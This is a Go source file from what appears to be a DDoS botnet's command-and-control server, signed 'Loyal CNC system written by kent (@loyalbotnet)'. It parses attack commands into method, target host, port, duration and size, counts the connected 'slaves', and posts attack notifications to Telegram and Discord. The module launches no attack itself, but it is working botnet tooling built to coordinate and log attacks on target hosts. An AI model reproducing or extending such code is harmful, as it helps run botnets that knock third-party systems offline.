package database

import (
	"fmt"
	"log"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"

	"cnc/core/config"
	"cnc/core/discordbot"
	"cnc/core/slaves"
)

func NewMessage(cmd string, duration string, userId int) {
	method, host, dport, length := parseCommand(cmd)
	startedby, _ := DatabaseConnection.GetUserName(userId)

	now := time.Now()
	message := fmt.Sprintf(
		"Method: %s\n"+
			"Host: %s\n"+
			"Dport: %s\n"+
			"Duration: %s\n"+
			"Size: %s\n"+
			"BotCount: %d\n"+
			"Started: %s\n"+
			"Started by: %s\nLoyal CNC system written by kent (@loyalbotnet)",
		method, host, dport, duration, length, slaves.CL.Count(), now.Format("2006-01-02 15:04:05"), startedby)

	New(message)

	// Send Discord notification as well
	go discordbot.SendAttackNotification(method, host, dport, duration, length, startedby, slaves.CL.Count())
}

func New(message string) {

	if !config.Config.Telegram.Enabled {
		return
	}

	bot, err := tgbotapi.NewBotAPI(config.Config.Telegram.BotToken)
	if err != nil {
		log.Printf("[telegram] Failed to send message: %v", err)
		return
	}

	msg := tgbotapi.NewMessage(int64(config.Config.Telegram.ChatId), message)
	_, err = bot.Send(msg)
	if err != nil {
		log.Printf("[telegram] Failed to send message: %v", err)
		return
	}
}
